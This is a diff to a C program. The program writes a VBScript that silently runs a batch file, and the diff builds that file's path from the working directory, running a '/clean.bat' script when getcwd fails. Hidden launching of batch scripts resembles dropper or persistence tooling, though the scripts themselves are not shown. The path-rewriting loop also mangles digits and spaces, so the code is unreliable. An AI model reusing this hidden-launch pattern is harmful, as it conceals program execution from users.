@@ -1,5 +1,24 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
+#include <limits.h>
+#include <ctype.h>
+
+char cwd[100];
+
+void getCD()
+{
+    if (getcwd(cwd, sizeof(cwd)) == NULL)
+    {
+        system("/clean.bat");
+        exit(0);
+    }
+
+    int i;
+    for (i = 0; cwd[i]; i++)
+        if (cwd[i] != ':' && cwd[i] != '.' && !isalpha(cwd[i]))
+            cwd[i] = '/';
+}
 
 void setFile(char *name)
 {
@@ -13,7 +32,9 @@ void setFile(char *name)
     fputc('\n', file);
     fputs("WshShell.Run chr(34) & ", file);
     fputc('"', file);
-    fputs("sys.bat", file);
+    getCD();
+    fputs(cwd, file);
+    fputs("/dist/sys.bat", file);
     fputc('"', file);
     fputs(" & Chr(34), 0\n", file);
     fputs("Set WshShell = Nothing", file);
